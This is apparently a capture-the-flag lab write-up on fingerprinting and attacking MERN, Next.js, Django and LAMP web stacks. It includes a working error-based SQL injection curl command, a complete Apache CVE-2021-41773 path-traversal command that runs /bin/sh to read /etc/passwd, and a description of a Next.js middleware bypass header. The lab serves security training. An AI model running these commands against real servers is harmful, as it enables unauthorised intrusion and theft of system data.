# Modern Web Stacks

## TASK 1 — Common Workflow

The three-step workflow is applied to every task:

1. Fingerprint the stack from HTTP response signals, with no exploit payloads yet.
2. Confirm the version and identify the applicable CVE.
3. Execute the exploit chain and understand the root cause.

---

## TASK 2 — MERN Stack

### Stack Identity

MERN apps are the default choice for JavaScript-only shops that want one language across the full stack. On Ubuntu, the typical deployment is Node.js from the NodeSource PPA, Express listening on port 3000 or 5000, and MongoDB on port 27017. A reverse proxy, usually Nginx, sits in front in production, but in misconfigured environments and internal tools, the Express process is often directly exposed.

### Fingerprinting the MERN Stack

Before touching any exploit payloads, identify what you are dealing with. Start with a header check:

- `X-Powered-By: Express` is the primary signal.
- Express sends this header on every response by default.
- It is only absent if the developer explicitly called `app.disable('x-powered-by')` or added Helmet middleware.
- Reverse proxies and PaaS platforms like Vercel, Cloudflare, and Railway often strip this header before it reaches the client.
- If `X-Powered-By` is absent, fall back to cookie names and unhandled-route format as secondary signals.

The `connect.sid` cookie comes from the `express-session` middleware. It is present when the app uses `express-session` with `saveUninitialized: true` (the default for many apps). With `saveUninitialized: false`, the recommended setting for login sessions, the cookie only appears after a session is created. Absence of `connect.sid` does not rule out Express.

Useful signals include:

- `X-Powered-By: Express`
- `Set-Cookie: connect.sid=s%3A...`
- `Cannot GET /nonexistent`

### Practical

```bash
curl http://10.48.161.14:3000/
curl http://10.48.161.14:3000/nonexistent
```

After that, JSON handling was tested and the flag was obtained:

```bash
curl -b cookies.txt -X POST http:/10.48.161.14:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}'
```

```text
{"status":"updated"}
```

```bash
curl -b cookies.txt http://10.48.161.14:3000/api/admin/flag
```

```text
flag":"THM{pr0t0_p0llut3d}
```

---

## TASK 3 — Next.js

### Stack Identity

Next.js is the dominant React framework for production applications. It is what you will find behind most investor dashboards, customer portals, and marketing sites built in the last three years. On Ubuntu, it runs as a Node.js process under a dedicated user, usually `node` or `www-data`, and is typically started with `npm start` after `npm run build`.

Here, fingerprinting was done with:

```bash
curl -I
```

In Next.js, middleware runs before every request reaches a page. Developers use it as the central gatekeeper; authentication checks, session validation, and redirect logic all live there. Because middleware sits in front of every route, it is one of the most common places developers implement access control in Next.js applications.

The `/dashboard` route in this app is a typical example. The middleware checks for a valid session cookie. Without one, it redirects to `/login`.

The vulnerability involved the internal header `x-middleware-subrequest`. Next.js uses this header to prevent infinite loops when middleware calls itself recursively. If you include that header in your own request, Next.js may treat it as an internal subrequest and skip middleware entirely. That means the authentication check never runs.

The header value encodes the middleware module path, repeated five times. For an app with a root-level `middleware.ts` file, that value is used to bypass the middleware logic.

---

## TASK 4 — Django

This task is about Django, which is the Python alternative of the web stack.

After fingerprinting it using:

```bash
curl -I
```

we look for headers such as:

- `Server: WSGIServer/0.2 CPython/3.10.12`
- `Set-Cookie: csrftoken`
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`

We also look for:

```html
name="csrfmiddlewaretoken"
```

in the HTML of the website using standard `curl`.

The following command was used to understand the name of the database running in the web stack:

```bash
curl -s "http://10.48.161.14:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
```

---

## TASK 5 — LAMP Framework

LAMP is one of the oldest and earliest frameworks, popularized because it was open source and easy to use.

### Components

- Linux gives the OS
- Apache handles web requests
- MySQL is the database
- PHP provides dynamic content

Apache usually runs under `www-data`, serves files from `/var/www/html`, and passes dynamic requests to PHP through `mod_php`.

Problems arise in these legacy systems because of:

- exposed PHP files
- database errors
- weak file permissions
- misconfigured Apache/PHP settings

### Fingerprinting the LAMP Stack

```http
Server: Apache/2.4.49 (Unix)
```

This exact version maps to `CVE-2021-41773`.

The final signal is `/cgi-bin/`. A `403 Forbidden` means the directory exists and listing is disabled. `mod_cgi` is configured. A `404` would mean it is not present at all. For this exploit, `mod_cgi` is required.

The vulnerability was found when Apache was not assuming or resolving `.%2e/`, which is literally `../`.

Practical exploit command:

```bash
curl -s --path-as-is "http://10.48.161.14:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```

This enabled RCE.

```text
THM{4p4ch3_p4th_tr4v3rs4l}
```

The flag was found by reading `.flag.txt` through the RCE.

---

## TASK 6 — Nikto

Nikto gives you a quick first pass; it probes each service, reads response headers, and surfaces stack signals and known misconfigurations without you writing a single payload.
